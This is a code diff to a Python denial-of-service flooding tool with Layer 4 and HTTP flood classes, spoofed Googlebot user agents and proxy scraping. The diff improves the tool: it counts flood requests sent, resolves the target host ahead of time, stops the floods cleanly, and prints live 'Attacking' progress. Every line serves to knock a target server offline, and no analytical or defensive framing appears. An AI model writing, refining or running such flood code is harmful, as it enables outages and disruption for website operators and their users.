@@ -24,6 +24,7 @@ from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
 from requests import get, Session, exceptions
 from yarl import URL
+import time
 
 localIP = get('http://ip.42.pl/raw').text
 currentDir = Path(__file__).parent
@@ -52,6 +53,8 @@ google_agents = ["Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/
                  "+http://www.google.com/bot.html)) "
                  "Googlebot/2.1 (+http://www.google.com/bot.html)",
                  "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"]
+
+requests_sent = 0
 
 
 class Tools:
@@ -101,9 +104,11 @@ class Layer4:
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
-        while 1:
+        while self._synevent.is_set():
             with suppress(Exception):
-                while 1:
+                while self._synevent.is_set():
+                    global requests_sent
+                    requests_sent = requests_sent + 1
                     self.SENT_FLOOD()
 
     def select(self, name):
@@ -239,7 +244,7 @@ class HttpFlood:
     _synevent: Any
     SENT_FLOOD: Any
 
-    def __init__(self, target: URL, method: str = "GET", rpc: int = 1,
+    def __init__(self, target: URL, host: str, method: str = "GET", rpc: int = 1,
                  synevent: Event = None, useragents: Set[str] = None,
                  referers: Set[str] = None,
                  proxies: Set[Proxy] = None) -> None:
@@ -248,10 +253,11 @@ class HttpFlood:
         self._rpc = rpc
         self._method = method
         self._target = target
-        self._raw_target = (self._target.host, (self._target.port or 80))
+        self._host = host
+        self._raw_target = (self._host, (self._target.port or 80))
 
         if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (gethostbyname(self._target.host), (self._target.port or 80))
+            self._raw_target = (self._host, (self._target.port or 80))
 
         if not referers:
             referers: List[str] = ["https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
@@ -292,9 +298,11 @@ class HttpFlood:
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
-        while 1:
+        while self._synevent.is_set():
             with suppress(Exception):
-                while 1:
+                while self._synevent.is_set():
+                    global requests_sent
+                    requests_sent = requests_sent + 1
                     self.SENT_FLOOD()
 
     @property
@@ -644,9 +652,12 @@ class ProxyManager:
     def download(provider, proxes: Set[Proxy], threadLock: Lock, proxy_type: ProxyType) -> Any:
         with suppress(TimeoutError, exceptions.ConnectionError, exceptions.ReadTimeout):
             data = get(provider["url"], timeout=provider["timeout"]).text
-            for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), proxy_type):
-                with threadLock:
-                    proxes.add(proxy)
+            try:
+                for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), proxy_type):
+                    with threadLock:
+                        proxes.add(proxy)
+            except Exception as e:
+                print('download proxy error', e)
 
 
 class ToolsConsole:
@@ -887,6 +898,8 @@ if __name__ == '__main__':
                 if one == "STOP": ToolsConsole.stop()
 
                 method = one
+                host = None
+                url = None
                 event = Event()
                 event.clear()
 
@@ -897,6 +910,11 @@ if __name__ == '__main__':
                     urlraw = argv[2].strip()
                     if not urlraw.startswith("http"): urlraw = "http://" + urlraw
                     url = URL(urlraw)
+                    host = url.host
+                    try:
+                        host = gethostbyname(url.host)
+                    except Exception as e:
+                        print('cant get host by name', url.host, e)
                     threads = int(argv[4])
                     rpc = int(argv[6])
                     timer = int(argv[7])
@@ -942,7 +960,7 @@ if __name__ == '__main__':
                     if proxies:
                         print(f"Proxy Count: {len(proxies):,}")
                     for _ in range(threads):
-                        Thread(target=HttpFlood, args=(url, method, rpc, event, uagents, referers, proxies,),
+                        Thread(target=HttpFlood, args=(url, host, method, rpc, event, uagents, referers, proxies,),
                                daemon=True).start()
 
                 if method in Methods.LAYER4_METHODS:
@@ -976,8 +994,11 @@ if __name__ == '__main__':
 
                 print("Attack Started !")
                 event.set()
-                while timer:
-                    timer -= 1
+                ts = time.time()
+                while time.time() < ts + timer:
+                    print('Attacking ' + ((str(host) + ':' + str(url.port or 80)) if host and url else str(argv[2])) + ' with ' + one + ' method')
+                    print('Requests sent: ' + str(requests_sent))
+                    print(str(round((time.time() - ts) / timer * 100, 2)) + '%')
                     sleep(1)
                 event.clear()
                 exit()
